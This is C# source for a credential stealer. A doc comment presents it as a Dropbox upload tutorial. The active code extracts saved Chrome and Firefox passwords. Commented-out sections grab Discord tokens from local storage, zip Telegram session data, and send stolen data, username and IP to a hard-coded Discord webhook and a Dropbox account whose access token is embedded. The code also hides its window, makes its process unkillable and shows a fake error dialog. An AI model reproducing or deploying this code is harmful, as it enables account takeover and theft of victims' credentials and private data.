using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Dropbox.Api.Files;
using Dropbox.Api.Sharing;
using Dropbox.Api;
using System.IO;
using System.IO.Compression;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Management;
using System.Net;
using CommandLine;

namespace UploadAFile
{
    /// <summary>
    /// This program will teach you how to upload a file to dropbox account and get its sharable download link.
    /// </summary>
    class Program
    {
        /*
        // hide console window at start
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static string token = "u9_-dQ3TjL4AAAAAAAAAASPT4CQ-YTx39865ksbX8nMgC1gp_oEt0bqFPtSD21w7";*/
        static void Main(string[] args)
        {
            /*
           // You can't kill me
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();
            CriticalProcess.NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            
            #region grabbing token
            string string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!dotldb(ref string1) && !dotldb(ref string1))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string2 = tokenx(string1, string1.EndsWith(".log"));
            if (string2 == "")
            {
                string2 = "N/A";
            }
            /*
            string string3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
            if (!dotldb(ref string3) && !dotlog(ref string3))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string4 = tokenx(string3, string3.EndsWith(".log"));
            if (string4 == "")
            {
                string4 = "N/A";
            }
            */
            /*
            #endregion
            
            //sending message to discord webhook
            using (defender defcon = new defender())
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject managementObject in mos.Get())
                {
                    String OSName = managementObject["Caption"].ToString();
                    defcon.ProfilePicture = "https://cdn.discordapp.com/attachments/779687033382764554/786566078012194836/photo_2020-12-10_17-40-54.jpg";
                    defcon.UserName = "Rachel❤Kingsman";
                    defcon.WebHook = "https://discord.com/api/webhooks/775802991159541811/tetCBT50_STp2gzyY-Qd23fYblSs_J4B_1VUlTX_uj2XoUNxe-Xmekw_RbZS1-_c0FHE";
                    defcon.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + " Token DiscordAPP: " + string2 + Environment.NewLine + /*"Token Chrome: " +string4 + "```");
                }
            }
            
            //Telegram Stealer 
            var userName = Environment.UserName;
            foreach (var process in Process.GetProcessesByName("telegram"))
            {
                process.Kill();
            }
            string startPath = "C:\\Users\\" + userName + "\\AppData\\Roaming\\Telegram Desktop\\tdata";
            string UWPpath = "C:\\Users\\" + userName + "\\AppData\\Local\\Packages\\TelegramMessengerLLP.TelegramDesktop_t4vj0pshhgkwm\\LocalCache\\Roaming\\Telegram Desktop UWP\\tdata";
            string zipPath = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_tdata.zip";


            if (Directory.Exists(startPath))
            {
                if (File.Exists(zipPath))
                {
                    File.Delete(zipPath);
                }
                ZipFile.CreateFromDirectory(startPath, zipPath);
            }
            else
            {
                if (File.Exists(zipPath))
                {
                    File.Delete(zipPath);
                }
                ZipFile.CreateFromDirectory(UWPpath, zipPath);
            }
         */
            // Firefox and Chrome stealer
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Exploit Blizzard");
            Console.ResetColor();

            //Get username of current user account
            string userAccountName = UploadAFile.MainHelper.GetCurrentUser();
            
                Options opts = new Options();

            //var parser = new Parser(with => with.HelpWriter = null);

            //Parse command line arguments
            //var result = parser.ParseArguments<Options>(args)
            // .WithParsed(parsed => opts = parsed);

            // parser.Dispose();*/
            var userName = Environment.UserName;
            var storedpass = "C:\\Users\\"+ userName +"\\AppData\\Local\\Temp\\blizzard.txt";
            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();
            loginDataList = (loginDataList.Concat(UploadAFile.MainHelper.GetChromePasswords(userAccountName))).ToList();
            UploadAFile.MainHelper.PrintLoginsToConsole(loginDataList);
            loginDataList = (loginDataList.Concat(UploadAFile.MainHelper.GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
            UploadAFile.MainHelper.PrintLoginsToConsole(loginDataList);
            Console.ReadLine();

                //Check command line arguments
                /*
                if (opts.All)
                {
                    loginDataList = (loginDataList.Concat(UploadAFile.MainHelper.GetChromePasswords(userAccountName))).ToList();
                    loginDataList = (loginDataList.Concat(UploadAFile.MainHelper.GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
                }
                else if (opts.Chrome)
                {
                    loginDataList = (loginDataList.Concat(UploadAFile.MainHelper.GetChromePasswords(userAccountName))).ToList();
                }
                else if (opts.Firefox)
                {
                    loginDataList = (loginDataList.Concat(UploadAFile.MainHelper.GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
                }
                else if (opts.Help)
                {
                    UploadAFile.MainHelper.PrintHelpToConsole();
                }
                //Check for case where no arguments were entered
                else if (opts.CheckIfNoArgs())
                {
                    UploadAFile.MainHelper.PrintHelpToConsole();
                }

                //Output all decrypted logins
                if (loginDataList.Count > 0)
                {
                    if (string.IsNullOrEmpty(opts.Outfile))
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        UploadAFile.MainHelper.PrintLoginsToConsole(loginDataList);
                    }
                    else
                    {
                        UploadAFile.MainHelper.WriteToCSV(loginDataList, opts.Outfile);
                    }
                }
                */


            /*
            var task = Task.Run((Func<Task>)Program.Run);
            task.Wait();
            Console.ReadKey();
            
            File.Delete(zipPath);*/

            /*
            var fakeError = "This program failed to start because window.dll was not found, Reinstalling the program may fix the problem.";
            var fakeTitle = "TelegramStealer.exe - System Error";
            MessageBox.Show(fakeError, fakeTitle);*/
        }
        
        


        /*
        #region grabbingIP
        static string GetIPAddress()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            return address;
        }
        #endregion

        #region stealingtoken
        private static bool dotlog(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string string1 = "";
            string string2 = @string;
            while (string2.Contains("oken"))
            {
                string[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = string.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }
            return string1;
        }
        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
        #endregion

        // telegram - Dropbox upload api function
        static async Task Run()
        {
            using (var dbx = new DropboxClient(token))
            {
                var userName = Environment.UserName;
                string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_tdata.zip";
                string folder = "/telestealer";
                string filename = "" + userName + "_tdata.zip";
                string url = "";
                using (var mem = new MemoryStream(File.ReadAllBytes(file)))
                {
                    var updated = dbx.Files.UploadAsync(folder + "/" + filename, WriteMode.Overwrite.Instance, body: mem);
                    updated.Wait();
                    var tx = dbx.Sharing.CreateSharedLinkWithSettingsAsync(folder + "/" + filename);
                    tx.Wait();
                    url = tx.Result.Url;
                }
                Console.Write(url);
            }
        }
        */
        
    }
}
